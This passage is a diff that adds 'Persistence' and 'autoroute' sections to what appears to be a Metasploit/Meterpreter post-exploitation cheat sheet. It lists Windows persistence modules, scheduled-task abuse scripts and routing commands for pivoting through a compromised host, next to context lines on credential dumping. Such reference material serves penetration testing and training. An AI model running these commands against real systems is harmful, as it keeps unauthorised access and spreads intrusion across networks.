@@ -45,3 +45,23 @@ creds_all
 use post/multi/recon/local_exploit_suggester
 set SESSION <>; run
 ```
+
+## Persistence
+
+```bash
+persistence -h
+use exploit/windows/local/persistence
+use exploit/windows/local/registry_persistence
+
+run scheduleme
+run schtaskabuse
+```
+
+## autoroute
+
+```bash
+run autoroute -s IP/CIDR
+run autoroute -p
+[OR]
+use post/multi/manage/autoroute
+```
